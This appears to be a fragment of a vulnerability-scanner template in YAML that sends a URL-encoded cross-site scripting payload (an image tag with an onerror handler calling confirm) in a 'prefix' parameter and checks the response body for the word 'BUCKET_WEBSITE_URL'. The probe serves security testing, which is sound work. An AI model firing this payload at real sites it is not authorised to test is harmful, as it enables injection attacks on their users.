    path:
      - "{{BaseURL}}/?prefix=%27%22%3CImg%20Src%20OnError=confirm(%27xElkomy%27)%3E"
    
    matchers:
      - type: word
        words:
          - "BUCKET_WEBSITE_URL"
        part: body
